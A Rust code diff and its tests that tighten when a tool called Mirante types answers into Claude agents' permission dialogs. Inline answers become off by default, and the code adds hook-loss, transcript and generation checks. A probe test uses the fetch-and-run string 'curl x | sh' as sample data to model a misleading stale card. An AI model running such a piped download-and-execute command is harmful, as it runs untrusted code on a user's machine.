@@ -5,7 +5,11 @@ use mirante_core::status::Input;
 use mirante_ipc::types::{AnswerPermission, BootState, PermissionView, SendMessage, SendMode, SendResult};
 use serde_json::json;
 
+use std::sync::atomic::Ordering;
+use std::sync::Arc;
+
 use super::{Hub, HubError, Result, State};
+use crate::driver::{AnswerGuard, DriverError};
 
 impl State {
     /// A pending request by full id or unique id suffix (at least 4 characters).
@@ -138,10 +142,20 @@ impl Hub {
     /// logged, not returned. Repeating the answer a request already has returns its stored
     /// row without acting again (a client retry); a different answer to it is a conflict.
     ///
-    /// Claude: Mirante answers a card only when it is the only pending card of its session.
-    /// With two or more, the dialog on screen cannot be tied to one card for sure (two
-    /// agents may even ask for the same tool and command), so the user answers in
-    /// `mirante attach`.
+    /// Claude: screen text can never prove which request a dialog belongs to, so Mirante
+    /// types an answer only when inline answers are on ([`Hub::set_claude_inline_answers`],
+    /// off by default) AND all of this holds, else nothing is typed and the answer is
+    /// [`HubError::AnswerInTerminal`] (`mirante attach <task>`):
+    /// 1. the card is the only pending card of its session (two agents may even ask for the
+    ///    same tool and command);
+    /// 2. no hook event missed the daemon since the card was created (the hook-loss marker,
+    ///    [`mirante_ipc::hookloss`], is unchanged): a lost hook may be a newer dialog;
+    /// 3. the transcript shows the card's `tool_use_id` as its agent's newest tool call,
+    ///    still without a result, and no newer tool call of any agent is open
+    ///    ([`super::evidence::ToolLedger::check`]);
+    /// 4. the session's card generation, captured here under the hub lock, is unchanged
+    ///    when the typist is about to type the key (it re-checks 2 and 4 then);
+    /// 5. the dialog on screen matches the card (`screen::dialog_matches`, defence in depth).
     ///
     /// The hub lock is not held while the driver types: the card is checked and marked
     /// under the lock, the lock is released for the driver, then re-taken; if the card was
@@ -149,7 +163,7 @@ impl Hub {
     /// (`permission_answer_unrecorded`) and the answer is a conflict.
     pub fn answer_permission(&self, a: AnswerPermission) -> Result<PermissionRequest> {
         let waited = std::time::Instant::now();
-        let (p, driver, key, description, agent) = loop {
+        let (p, driver, key, description, agent, guard, branch) = loop {
             let mut st = self.lock();
             let p = match st.find_permission(&a.id) {
                 Ok(p) => p,
@@ -158,6 +172,7 @@ impl Hub {
                 Err(HubError::NotFound(m)) => return st.answered_permission(&a.id, a.allow, m),
                 Err(e) => return Err(e),
             };
+            let branch = st.store.get_task(&p.task_id)?.branch;
             let l = st
                 .live
                 .get(&p.task_id)
@@ -175,8 +190,12 @@ impl Hub {
                 std::thread::sleep(std::time::Duration::from_millis(20));
                 continue;
             }
-            let (key, description) = match agent {
+            let terminal = |reason: String| HubError::AnswerInTerminal { task: branch.clone(), reason };
+            let (key, description, guard) = match agent {
                 AgentKind::Claude => {
+                    if !self.claude_inline_answers() {
+                        return Err(terminal(INLINE_OFF.into()));
+                    }
                     let pending: Vec<PermissionRequest> = st
                         .store
                         .pending_permissions(&p.task_id)?
@@ -184,30 +203,55 @@ impl Hub {
                         .filter(|q| q.session_id == p.session_id)
                         .collect();
                     if pending.len() > 1 {
-                        return Err(HubError::Conflict(several_cards(&pending)));
+                        return Err(terminal(several_cards(&pending)));
                     }
-                    (p.detail.clone(), l.dialogs.get(&p.id).and_then(|k| k.description.clone()))
+                    let k = l.dialogs.get(&p.id).ok_or_else(|| terminal("the card's dialog is unknown".into()))?;
+                    let marked = k.hook_lost;
+                    if mirante_ipc::hookloss::fingerprint(&st.paths) != marked {
+                        return Err(terminal(HOOK_LOST.into()));
+                    }
+                    l.ledger.check(k.tool_use_id.as_deref(), k.agent.as_deref()).map_err(terminal)?;
+                    let (gen, seen) = (l.card_gen.clone(), l.card_gen.load(Ordering::SeqCst));
+                    let paths = st.paths.clone();
+                    let guard: AnswerGuard = Arc::new(move || {
+                        if gen.load(Ordering::SeqCst) != seen {
+                            return Err("the session changed since the answer was checked (a hook, a card or a \
+                                        tool call arrived)"
+                                .into());
+                        }
+                        if mirante_ipc::hookloss::fingerprint(&paths) != marked {
+                            return Err(HOOK_LOST.into());
+                        }
+                        Ok(())
+                    });
+                    (p.detail.clone(), k.description.clone(), Some(guard))
                 }
                 AgentKind::Codex => {
                     let key = l.perm_keys.get(&p.id).cloned().ok_or_else(|| {
                         HubError::Conflict(format!("permission request {} has no pending approval in the agent", p.id))
                     })?;
-                    (key, None)
+                    (key, None, None)
                 }
             };
             if let Some(l) = st.live.get_mut(&p.task_id) {
                 l.answering.insert(p.id.clone());
             }
-            break (p, driver, key, description, agent);
+            break (p, driver, key, description, agent, guard, branch);
         };
-        let typed = driver.answer_permission(&key, &p.tool, description.as_deref(), a.allow);
+        let typed = driver.answer_permission(&key, &p.tool, description.as_deref(), a.allow, guard);
         let mut st = self.lock();
         let live = st.live.get_mut(&p.task_id).filter(|l| l.session_id == p.session_id);
         let same_session = live.is_some();
         if let Some(l) = live {
             l.answering.remove(&p.id);
         }
-        typed?;
+        match typed {
+            // The Claude typist refused (the dialog or the evidence changed): nothing was typed.
+            Err(DriverError::NoDialog(m) | DriverError::NotNow(m)) if agent == AgentKind::Claude => {
+                return Err(HubError::AnswerInTerminal { task: branch, reason: m });
+            }
+            r => r?,
+        }
         let still_pending = st.store.pending_permissions(&p.task_id)?.iter().any(|q| q.id == p.id);
         if !same_session || !still_pending {
             let why = if same_session { "the card was settled meanwhile" } else { "the session ended meanwhile" };
@@ -260,6 +304,13 @@ impl Hub {
         Ok(answered)
     }
 }
+
+/// Why a Claude card is not answered with inline answers off.
+const INLINE_OFF: &str = "Mirante does not type Claude permission answers (inline answers are off; \
+                          MIRANTE_CLAUDE_INLINE_ANSWERS=1 on the daemon turns them on)";
+/// Why a Claude card is not answered after a hook event missed the daemon.
+const HOOK_LOST: &str = "a hook event missed the daemon since this card was created (spooled or lost), so the \
+                         dialog on screen may be another one";
 
 /// How long an answer waits for another answer to the same card that is being typed.
 const IN_FLIGHT_WAIT: std::time::Duration = std::time::Duration::from_secs(6);
@@ -380,12 +431,11 @@ mod tests {
     #[test]
     fn claude_permission_answer_types_the_choice_then_persists_once() {
         let k = Kit::new();
+        k.inline();
         let t = k.started(AgentKind::Claude, "a").task;
         k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
-        k.hook(
-            &t.id,
-            json!({"hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": {"command": "touch x"}}),
-        );
+        k.tool_use("t1");
+        k.hook(&t.id, perm("t1", "touch x", None));
         let p = k.hub.permissions().unwrap();
         assert_eq!(p.len(), 1);
         assert_eq!(p[0].branch, "a");
@@ -400,9 +450,11 @@ mod tests {
     #[test]
     fn repeating_the_same_answer_returns_the_stored_row() {
         let k = Kit::new();
+        k.inline();
         let t = k.started(AgentKind::Claude, "a").task;
         k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
-        k.hook(&t.id, json!({"hook_event_name": "PermissionRequest", "tool_name": "Bash"}));
+        k.tool_use("t1");
+        k.hook(&t.id, perm("t1", "ls", None));
         let id = k.hub.permissions().unwrap()[0].request.id.clone();
         let first = k.hub.answer_permission(AnswerPermission { id: id.clone(), allow: true }).unwrap();
         // A retry (the client lost the reply), by full id or by suffix: same row, nothing typed again.
@@ -426,14 +478,17 @@ mod tests {
     #[test]
     fn a_failed_driver_answer_persists_nothing() {
         let k = Kit::new();
+        k.inline();
         let t = k.started(AgentKind::Claude, "a").task;
         k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
-        k.hook(&t.id, json!({"hook_event_name": "PermissionRequest", "tool_name": "Bash"}));
+        k.tool_use("t1");
+        k.hook(&t.id, perm("t1", "ls", None));
         k.factory.driver.fail_answers.store(true, Ordering::SeqCst);
         let id = k.hub.permissions().unwrap()[0].request.id.clone();
+        // The dialog on screen did not match: nothing typed, answer it in the terminal.
         assert!(matches!(
             k.hub.answer_permission(AnswerPermission { id, allow: true }),
-            Err(HubError::Driver(crate::driver::DriverError::NoDialog(_)))
+            Err(HubError::AnswerInTerminal { .. })
         ));
         assert_eq!(k.hub.permissions().unwrap().len(), 1);
     }
@@ -507,14 +562,16 @@ mod tests {
     #[test]
     fn a_card_is_answered_only_when_it_is_the_only_one_pending_in_its_session() {
         let k = Kit::new();
+        k.inline();
         let t = k.started(AgentKind::Claude, "a").task;
         k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
+        k.tool_use("t1");
         k.hook(&t.id, perm("t1", "touch a", None));
         k.hook(&t.id, perm("s1", "touch b", Some("a-1")));
         let p = k.hub.permissions().unwrap();
         for card in &p {
             let r = k.hub.answer_permission(AnswerPermission { id: card.request.id.clone(), allow: true });
-            let Err(HubError::Conflict(m)) = r else { panic!("{r:?}") };
+            let Err(HubError::AnswerInTerminal { reason: m, .. }) = r else { panic!("{r:?}") };
             assert!(m.contains("mirante attach") && m.contains("touch a") && m.contains("touch b"), "{m}");
         }
         assert!(k.calls().is_empty());
@@ -531,13 +588,15 @@ mod tests {
     #[test]
     fn two_agents_asking_for_the_same_command_are_never_answered_by_mirante() {
         let k = Kit::new();
+        k.inline();
         let t = k.started(AgentKind::Claude, "a").task;
         k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
+        k.tool_use("t1");
         k.hook(&t.id, perm("t1", "rm -rf build", None));
         k.hook(&t.id, perm("s1", "rm -rf build", Some("a-1")));
         for card in k.hub.permissions().unwrap() {
             let r = k.hub.answer_permission(AnswerPermission { id: card.request.id, allow: true });
-            let Err(HubError::Conflict(m)) = r else { panic!("{r:?}") };
+            let Err(HubError::AnswerInTerminal { reason: m, .. }) = r else { panic!("{r:?}") };
             assert!(m.contains("same tool and command") && m.contains("mirante attach"), "{m}");
         }
         assert!(k.calls().is_empty());
@@ -546,11 +605,13 @@ mod tests {
     #[test]
     fn the_hook_description_reaches_the_driver() {
         let k = Kit::new();
+        k.inline();
         let t = k.started(AgentKind::Claude, "a").task;
         k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
+        k.tool_use("t1");
         k.hook(
             &t.id,
-            json!({"hook_event_name": "PermissionRequest", "tool_name": "Bash",
+            json!({"hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_use_id": "t1",
                 "tool_input": {"command": "touch x", "description": "Create x"}}),
         );
         let id = k.hub.permissions().unwrap()[0].request.id.clone();
@@ -561,8 +622,10 @@ mod tests {
     #[test]
     fn the_hub_lock_is_free_while_the_driver_types_and_a_card_settled_meanwhile_is_a_conflict() {
         let k = Kit::new();
+        k.inline();
         let t = k.started(AgentKind::Claude, "a").task;
         k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
+        k.tool_use("t1");
         k.hook(&t.id, pre("t1", None));
         k.hook(&t.id, perm("t1", "touch x", None));
         let id = k.hub.permissions().unwrap()[0].request.id.clone();
@@ -619,6 +682,180 @@ mod tests {
         assert!(k.calls().contains(&"interrupt".to_string()));
     }
 
+    /// One pending Claude card for tool call `t1` ("touch x"), with inline answers on and
+    /// the transcript showing `t1`: everything an answer needs.
+    fn answerable(k: &Kit) -> (String, String) {
+        k.inline();
+        let t = k.started(AgentKind::Claude, "a").task;
+        k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
+        k.tool_use("t1");
+        k.hook(&t.id, perm("t1", "touch x", None));
+        let id = k.hub.permissions().unwrap()[0].request.id.clone();
+        (t.id, id)
+    }
+
+    fn in_terminal(r: Result<PermissionRequest>) -> String {
+        match r {
+            Err(HubError::AnswerInTerminal { task, reason }) => format!("{task}: {reason}"),
+            r => panic!("expected AnswerInTerminal, got {r:?}"),
+        }
+    }
+
+    #[test]
+    fn claude_answers_are_off_by_default_and_point_to_the_terminal() {
+        let k = Kit::new();
+        let t = k.started(AgentKind::Claude, "feat-x").task;
+        k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
+        k.tool_use("t1");
+        k.hook(&t.id, perm("t1", "touch x", None));
+        assert!(!k.hub.claude_inline_answers() && !k.hub.status().claude_inline_answers);
+        let id = k.hub.permissions().unwrap()[0].request.id.clone();
+        let e = k.hub.answer_permission(AnswerPermission { id, allow: true }).unwrap_err();
+        assert!(matches!(e, HubError::AnswerInTerminal { .. }), "{e:?}");
+        let rpc = mirante_ipc::RpcError::from(e);
+        assert_eq!(rpc.code, mirante_ipc::rpc::code::ANSWER_IN_TERMINAL);
+        assert!(rpc.message.contains("mirante attach feat-x") && rpc.message.contains("inline answers are off"));
+        assert!(k.calls().iter().all(|c| !c.starts_with("answer:")), "{:?}", k.calls());
+        assert_eq!(k.hub.permissions().unwrap().len(), 1, "the card stays for the terminal answer");
+        // Codex answers are protocol-level (by request id) and unchanged.
+        let c = k.started(AgentKind::Codex, "c").task;
+        k.emit(DriverEvent::PermissionRequested { key: "7".into(), tool: "command".into(), detail: "ls".into() });
+        let cid = k.hub.permissions().unwrap().into_iter().find(|p| p.request.task_id == c.id).unwrap().request.id;
+        k.hub.answer_permission(AnswerPermission { id: cid, allow: true }).unwrap();
+        assert!(k.calls().contains(&"answer:7:command:true".to_string()));
+    }
+
+    #[test]
+    fn without_the_tool_call_in_the_transcript_nothing_is_typed() {
+        let k = Kit::new();
+        k.inline();
+        let t = k.started(AgentKind::Claude, "a").task;
+        k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
+        k.hook(&t.id, perm("t1", "touch x", None));
+        let id = k.hub.permissions().unwrap()[0].request.id.clone();
+        let m = in_terminal(k.hub.answer_permission(AnswerPermission { id: id.clone(), allow: true }));
+        assert!(m.contains("does not show tool call t1"), "{m}");
+        // A card with no tool_use_id at all (no PreToolUse to borrow one from) never is.
+        k.hook(
+            &t.id,
+            json!({"hook_event_name": "PermissionRequest", "tool_name": "Bash",
+            "tool_input": {"command": "ls"}}),
+        );
+        let bare = k.hub.permissions().unwrap()[0].request.id.clone();
+        let m = in_terminal(k.hub.answer_permission(AnswerPermission { id: bare, allow: true }));
+        assert!(m.contains("no tool_use_id"), "{m}");
+        assert!(k.calls().iter().all(|c| !c.starts_with("answer:")));
+    }
+
+    #[test]
+    fn a_newer_tool_call_without_a_card_or_a_result_already_in_refuses_the_answer() {
+        let k = Kit::new();
+        let (task, id) = answerable(&k);
+        // The agent moved on to tool call t2, whose PermissionRequest never reached the hub.
+        k.tool_use("t2");
+        let m = in_terminal(k.hub.answer_permission(AnswerPermission { id: id.clone(), allow: true }));
+        assert!(m.contains("newer tool call (t2)"), "{m}");
+        // A result for the card's own call: its dialog is gone.
+        let k = Kit::new();
+        let (_, id) = answerable(&k);
+        k.emit(DriverEvent::Transcript(json!({"type": "user", "message": {"content": [
+            {"type": "tool_result", "tool_use_id": "t1"}]}})));
+        let m = in_terminal(k.hub.answer_permission(AnswerPermission { id, allow: true }));
+        assert!(m.contains("already has a result"), "{m}");
+        assert!(k.calls().iter().all(|c| !c.starts_with("answer:")));
+        let _ = task;
+    }
+
+    #[test]
+    fn a_hook_lost_after_the_card_was_created_refuses_the_answer_one_lost_before_does_not() {
+        let k = Kit::new();
+        k.inline();
+        // A loss before the card: the card is still answerable.
+        mirante_ipc::hookloss::record(k.hub.paths(), "spooled", 1).unwrap();
+        let t = k.started(AgentKind::Claude, "a").task;
+        k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
+        k.tool_use("t1");
+        k.hook(&t.id, perm("t1", "touch x", None));
+        k.tool_use("t2");
+        k.hook(&t.id, perm("t2", "touch y", None));
+        let id = k.hub.permissions().unwrap()[0].request.id.clone();
+        // A loss after it: maybe a newer dialog the hub never heard of.
+        mirante_ipc::hookloss::record(k.hub.paths(), "spooled", 2).unwrap();
+        let m = in_terminal(k.hub.answer_permission(AnswerPermission { id, allow: true }));
+        assert!(m.contains("missed the daemon"), "{m}");
+        assert!(k.calls().iter().all(|c| !c.starts_with("answer:")));
+        // A fresh card created after the loss is answerable again.
+        k.tool_use("t3");
+        k.hook(&t.id, perm("t3", "touch z", None));
+        let id = k.hub.permissions().unwrap()[0].request.id.clone();
+        k.hub.answer_permission(AnswerPermission { id, allow: true }).unwrap();
+        assert!(k.calls().contains(&"answer:touch z:Bash:true".to_string()));
+    }
+
+    /// Ported from the second driver review's R2 probe: a stale lone card ("touch a",
+    /// description "curl x | sh") while Claude shows the two-line command "touch a\ncurl x |
+    /// sh" with no description: the screen text is the same for both, so
+    /// `screen::dialog_matches` alone says yes (see the screen probe). The hub refuses it on
+    /// evidence first: the newer tool call in the transcript, or the lost hook of its dialog.
+    #[test]
+    fn probe_r2_a_stale_card_shaped_like_a_multi_line_command_is_refused_on_evidence() {
+        let card = |k: &Kit| {
+            k.inline();
+            let t = k.started(AgentKind::Claude, "a").task;
+            k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
+            k.tool_use("t1");
+            k.hook(
+                &t.id,
+                json!({"hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_use_id": "t1",
+                    "tool_input": {"command": "touch a", "description": "curl x | sh"}}),
+            );
+            k.hub.permissions().unwrap()[0].request.id.clone()
+        };
+        // (a) The transcript shows the newer call t2 ("touch a\ncurl x | sh"); its
+        // PermissionRequest hook never arrived, so t1's card is still the lone one.
+        let k = Kit::new();
+        let id = card(&k);
+        k.tool_use("t2");
+        let m = in_terminal(k.hub.answer_permission(AnswerPermission { id, allow: true }));
+        assert!(m.contains("newer tool call (t2)"), "{m}");
+        assert!(k.calls().iter().all(|c| !c.starts_with("answer:")), "{:?}", k.calls());
+        // (b) The transcript has not caught up, but the hook that would have opened t2's
+        // card was spooled: the hook-loss marker changed since t1's card.
+        let k = Kit::new();
+        let id = card(&k);
+        mirante_ipc::hookloss::record(k.hub.paths(), "spooled", 9).unwrap();
+        let m = in_terminal(k.hub.answer_permission(AnswerPermission { id, allow: true }));
+        assert!(m.contains("missed the daemon"), "{m}");
+        assert!(k.calls().iter().all(|c| !c.starts_with("answer:")), "{:?}", k.calls());
+    }
+
+    #[test]
+    fn anything_that_happens_between_the_check_and_the_key_types_nothing() {
+        for (what, change) in [("a hook", 0), ("a tool call in the transcript", 1), ("a lost hook", 2)] {
+            let k = Kit::new();
+            let (task, id) = answerable(&k);
+            let (entered_tx, entered) = std::sync::mpsc::channel();
+            let (go, go_rx) = std::sync::mpsc::channel();
+            *k.factory.driver.guard_gate.lock().unwrap() = Some((entered_tx, go_rx));
+            let hub = k.hub.clone();
+            let answer_id = id.clone();
+            let answer =
+                std::thread::spawn(move || hub.answer_permission(AnswerPermission { id: answer_id, allow: true }));
+            entered.recv_timeout(std::time::Duration::from_secs(5)).unwrap();
+            match change {
+                0 => k.hook(&task, json!({"hook_event_name": "Notification", "message": "x"})),
+                1 => k.tool_use("t2"),
+                _ => mirante_ipc::hookloss::record(k.hub.paths(), "breaker", 5).unwrap(),
+            }
+            go.send(()).unwrap();
+            let r = answer.join().unwrap();
+            assert!(matches!(r, Err(HubError::AnswerInTerminal { .. })), "{what}: {r:?}");
+            assert!(k.calls().iter().all(|c| !c.starts_with("answer:")), "{what}: {:?}", k.calls());
+            assert_eq!(k.hub.permissions().unwrap().len(), 1, "{what}: the card stays pending");
+            assert!(k.hub.lock().live[&task].answering.is_empty());
+        }
+    }
+
     #[test]
     fn queue_on_an_idle_agent_with_a_backlog_kicks_the_backlog() {
         let k = Kit::new();
@@ -658,6 +895,7 @@ mod tests {
     #[test]
     fn neither_of_two_cards_of_different_agents_is_answered() {
         let k = Kit::new();
+        k.inline();
         let t = k.started(AgentKind::Claude, "a").task;
         k.hook(&t.id, json!({"hook_event_name": "UserPromptSubmit"}));
         k.hook(&t.id, json!({"hook_event_name": "PermissionRequest", "tool_name": "Bash"}));
@@ -665,7 +903,7 @@ mod tests {
         for p in k.hub.permissions().unwrap() {
             assert!(matches!(
                 k.hub.answer_permission(AnswerPermission { id: p.request.id, allow: true }),
-                Err(HubError::Conflict(_))
+                Err(HubError::AnswerInTerminal { .. })
             ));
         }
         assert!(k.calls().is_empty());
